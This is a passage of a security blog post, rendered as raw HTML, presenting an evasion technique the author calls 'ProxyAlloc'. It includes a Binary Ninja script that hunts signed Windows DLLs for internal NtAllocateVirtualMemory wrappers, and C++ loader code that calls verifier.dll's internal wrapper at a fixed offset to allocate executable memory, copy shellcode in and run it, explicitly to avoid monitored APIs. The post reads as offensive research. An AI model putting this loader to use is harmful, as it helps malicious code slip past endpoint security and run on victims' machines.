href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9hd8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> to scan every signed DLL there for functions that might serve as a wrapper for <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The high-level overview of the search algorithm for any DLL is as follows:</p><ol class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'1.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Check if <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code> is imported by our target.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'2.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">If imported, check all its call sites for two separate special cases below.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'3.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Mark the location if <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">Protect</code> and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegionSize</code> arguments can be supplied through the caller function's parameters.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'4.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Mark the location if <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RWX</code> memory of more than <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">64KB</code> is allocated.</p></div></li></ol><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The script is as follows and could be improved to account for more valid cases:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1l8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">import os<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">import binaryninja<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">from binaryninja import highlevelil<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content"># File with all signed dll paths in C:\Windows\System32\*<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">signed_dlls_path = r'C:\Users\user\source\repos\SignedDllAnalyzer\signed_dlls.txt'<!-- -->
</span></span><span class="highlight-line highlighted"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content"># Counting how many dlls are to be processed<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">with open(signed_dlls_path, "r") as f:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    signed_dlls = [dll.strip() for dll in f]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">total_dlls = len(signed_dlls)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">with open(signed_dlls_path, "r") as f:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	current_dll = 0<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	# Processing each dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	for signed_dll_path in f:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		current_dll += 1<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		# Preparing variables for the progress bar<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		signed_dll_path = signed_dll_path.strip()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		dll_name = signed_dll_path.split('\\')[-1]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		dll_size_mb = os.path.getsize(signed_dll_path) / 1024 / 1024<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		progress = f"{current_dll}/{total_dlls}"<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		# We don't want to process dlls with size more than 15 MB<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		if dll_size_mb &gt; 15:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			print(f"[-] [{progress}] [{dll_name}] [{dll_size_mb:.2f} &gt; 15 MB]")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		# Update progress bar<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		print(f"[*] [{progress}] [{dll_name}] [{dll_size_mb:.2f} MB]")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		# Open the dll in Binary Ninja without advanced analysis<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">		with binaryninja.load(signed_dll_path, update_analysis=False) as binary_view:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			# Check if NtAllocateVirtualMemory is imported by the dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			ntAllocateVirtualMemorySymbol = binary_view.get_symbol_by_raw_name("NtAllocateVirtualMemory")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			# If it is not imported, we skip to the next dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			if not ntAllocateVirtualMemorySymbol:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">			else:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				# If it is imported, update progress and perform dll analysis<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				print(f"[+] [{progress}] [{dll_name}] [NtAllocateVirtualMemory]")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				binary_view.set_analysis_hold(False)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				binary_view.update_analysis_and_wait()<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				# Get all code references of the NtAllocateVirtualMemory call and process each one<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				code_refs = binary_view.get_code_refs(ntAllocateVirtualMemorySymbol.address)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">				for ref in code_refs:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					try:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Get the function which contains target code reference<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						func = binary_view.get_functions_containing(ref.address)[0]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Get the HLIL (High Level IL) representation of the call site<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						hlil_instr = func.get_llil_at(ref.address).hlil<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Specifically look for the NtAllocateVirtualMemory call<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						for operand in hlil_instr.operands:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">							if type(operand) == HighLevelILCall:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">								if operand.dest.value.value == ntAllocateVirtualMemorySymbol.address:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">									hlil_call = operand<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">									break<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Process arguments of the NtAllocateVirtualMemory call (specifically Protect and RegionSize)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						args = hlil_call.params<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						protect = args[5]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						regionSize = args[3]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# More cases could be added here (for example, variable SSA form analysis)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Case 1: arguments are directly supplied from wrapper function parameters<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						if type(protect) == HighLevelILVar:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">							if protect.var not in func.parameter_vars:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">								continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						if type(regionSize) == HighLevelILVar:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">							if regionSize.var not in func.parameter_vars:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">								continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# Case 2: arguments are constant<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						if type(protect) == HighLevelILConst:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">							if int(protect.value) != 0x40: # looking for RWX<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">								continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						if type(regionSize) == HighLevelILConst:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">							if int(regionSize.value) &lt;= 0x10000: # looking for more than 64 KB<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">								continue<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						# If reached here, update the progress to sumbit finding for manual analysis<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						print(f"[+] [{progress}] [{dll_name}] [{hex(ref.address)}] [{hlil_instr}]")<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">					except Exception as e:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">						print(f"[x] [{progress}] [{dll_name}] [{e}]")</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">After running the script, we can observe multiple findings:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FlT2J5CHhifFlcbb9DZwQ%252Fimage.png%3Falt%3Dmedia%26token%3Dbed53af9-3bea-47e3-b4f2-e2ac57c0401b&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=2b4e5bdf&amp;sv=2" width="1437" height="174"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">For example, both of those functions are essentially wrappers around <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FHSy6TsgiSnv0mbcyDEG3%252Fimage.png%3Falt%3Dmedia%26token%3Dd4212bf8-4b1b-4a99-98e3-5fa93457db34&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=f887a963&amp;sv=2" width="2203" height="1343"></div></div></div></div><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252F56E1smxW5eSzMhOPH591%252Fimage.png%3Falt%3Dmedia%26token%3D0c0a67d2-8030-40bf-be64-8e23013f4449&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=9aa930e8&amp;sv=2" width="2210" height="656"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Curious readers might ask, if we consider calling them instead of <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>, how is this different from calling <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">kernel32.VirtualAlloc</code>?</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Two main differences that are relevant for us:</p><ol class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'1.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">VirtualAlloc</code> is monitored by security solutions even more than <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'2.';--font-family:inherit;font-size:min(1em, 24px)"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">It is an exported API function, while both functions above are internal for <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">verifier.dll</code>.</p></div></li></ol><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Other than that, yes, it is very similar to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">VirtualAlloc</code>, which itself is a wrapper around <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FtcqXRGYxFmhOUGwnkVeK%252Fimage.png%3Falt%3Dmedia%26token%3D3bf08eaf-2c46-4050-9622-80d5a96793fb&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=383af71a&amp;sv=2" width="2617" height="491"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">The technique itself: ProxyAlloc</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I decided to call this method <strong class="font-bold">ProxyAlloc</strong>, as we are proxying our actual call to <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code> through any Microsoft-signed DLL that has an internal wrapper around it.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The code for this technique is as follows (example with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">verifier.AVrfpNtAllocateVirtualMemory</code>):</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2h8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">typedef NTSTATUS (*AVrfpNtAllocateVirtualMemory_t)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">(<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    HANDLE ProcessHandle,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    PVOID *BaseAddress,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ULONG_PTR ZeroBits,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ULONG_PTR *RegionSize,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ULONG AllocationType,<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    ULONG Protect<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">DWORD protect{};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">LPVOID virtualMemory = nullptr;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SIZE_T size = rawShellcodeLength;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">HMODULE hVerifierMod = this-&gt;api.LoadLibraryA.call("verifier.dll");<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">AVrfpNtAllocateVirtualMemory_t AVrfpNtAllocateVirtualMemory = (AVrfpNtAllocateVirtualMemory_t)((char*)hVerifierMod + 0x25110);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">AVrfpNtAllocateVirtualMemory(NtCurrentProcess(), &amp;virtualMemory, 0, &amp;size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">this-&gt;api.RtlMoveMemory.call(virtualMemory, rawShellcode, rawShellcodeLength);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">(*(int(*)()) virtualMemory)();</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">It also could be improved, for example, by using pattern scanning instead of plain offsets.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The call stack observed after using this method is:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" 